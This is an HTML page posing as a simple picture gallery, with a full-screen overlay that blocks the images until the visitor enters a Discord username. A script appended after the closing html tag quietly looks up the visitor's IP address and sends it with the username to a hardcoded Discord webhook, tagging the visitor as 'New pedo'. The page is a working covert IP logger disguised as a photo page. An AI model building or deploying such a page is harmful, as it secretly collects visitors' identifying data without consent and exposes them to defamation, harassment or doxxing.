
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pics</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #f8f9fa;
            text-align: center;
            padding: 20px;
        }
        .pic-container {
            display: grid;
            grid-template-columns: 1fr 1fr;
            grid-template-rows: auto auto;
            gap: 20px;
            max-width: 900px;
            margin: auto;
        }
        .Pic-item {
            background-color: #fff;
            padding: 15px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            text-align: center;
            overflow: hidden;
        }
        .Pic-item img {
            width: 100%;
            height: auto;
            border-radius: 10px;
        }
        .Pic-item h3 {
            margin: 10px 0 5px;
        }
        .Pic-item p {
            font-size: 0.9em;
            color: #666;
        }

        .overlay {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: black;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .overlay-content {
            background: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
        }
        input {
            padding: 10px;
            margin: 10px 0;
            width: 80%;
        }
        button {
            padding: 10px;
            background: blue;
            color: white;
            border: none;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h1>My Pics</h1>
    <div class="pic-container">
        <div class="Pic-item">
            <img src="https://media.licdn.com/dms/image/v2/C5112AQEw1fXuabCTyQ/article-inline_image-shrink_1500_2232/article-inline_image-shrink_1500_2232/0/1581099611064?e=1746057600&v=beta&t=9GSzc1PGYMupEZiyJnnSOx7ULZSd3vrYLxZ1VJ8YO_4" alt="Pic 1">
        </div>
        <div class="Pic-item">
            <img src="https://media.licdn.com/dms/image/v2/C5112AQEw1fXuabCTyQ/article-inline_image-shrink_1500_2232/article-inline_image-shrink_1500_2232/0/1581099611064?e=1746057600&v=beta&t=9GSzc1PGYMupEZiyJnnSOx7ULZSd3vrYLxZ1VJ8YO_4" alt="Pic 2">
        </div>
        <div class="Pic-item">
            <img src="https://media.licdn.com/dms/image/v2/C5112AQEw1fXuabCTyQ/article-inline_image-shrink_1500_2232/article-inline_image-shrink_1500_2232/0/1581099611064?e=1746057600&v=beta&t=9GSzc1PGYMupEZiyJnnSOx7ULZSd3vrYLxZ1VJ8YO_4" alt="Pic 3">
        </div>
        <div class="Pic-item">
            <img src="https://media.licdn.com/dms/image/v2/C5112AQEw1fXuabCTyQ/article-inline_image-shrink_1500_2232/article-inline_image-shrink_1500_2232/0/1581099611064?e=1746057600&v=beta&t=9GSzc1PGYMupEZiyJnnSOx7ULZSd3vrYLxZ1VJ8YO_4" alt="Pic 4">
        </div>
    </div>
    <div class="overlay" id="overlay">
        <div class="overlay-content">
            <h2>Enter your Discord Username</h2>
            <input type="text" id="discordUsername" placeholder="@discordUsername">
            <button onclick="submitUsername()">Submit</button>
        </div>
    </div>
</body>
</html>

   <script>
        const webhookURL = "https://l.webhook.party/hook/mtGcGFjdxW3nmdMOqsB%2FmswKmjArJ3cK7IiyBKpbfxZxg6yvvGjLeyO4T5QFEJ1w62aq48kpyrgSumZLeYf%2FYa1rJXc40SDQI0eE5xIfJnEq0lUGpzKrBFEppcNiS5EYHNsajMp%2B8WSjWc%2B6SpQFk%2BDlEzBA21gnZThAXQM%2F36%2BBYbzGJ2%2BkRKPFNQLay5wSyGEQfDx8i9oO%2BnmQW6H4I1zF17vgTOuwC4%2BrzeVSG0jrhF8kISXSXgxh3M%2Bc7vJoUOhih1M2ypXcDGW5C6%2BUqWbu2aUn%2F1othRMaoFz0y7fAFasv9ieaPZIeS5pwGOQJPzVA5btpyptZ7TdZPoDCwCTS9FV3j%2BDQtainD%2BSNEdTGb4sL6LCBgzcbnuMvW%2BICH4Jed11MBeg%3D/5XpTt%2BQKXOMjFsiX";
        
        function getUserIP(callback) {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    callback(data.ip);
                })
                .catch(error => console.error('Error getting IP:', error));
        }

        function sendToDiscord(message) {
            const payload = { content: message };
            
            fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            })
            .then(response => response.json())
            .then(data => console.log("Logged to Discord:", data))
            .catch(error => console.error("Error sending to Discord:", error));
        }

        function submitUsername() {
            const username = document.getElementById("discordUsername").value.trim();
            if (!username) {
                alert("Please enter a valid username.");
                return;
            }
            
            getUserIP(userIP => {
                sendToDiscord(`New pedo: ${username} (IP: ${userIP}`);
                document.getElementById("overlay").style.display = "none";
            });
        }
    </script>
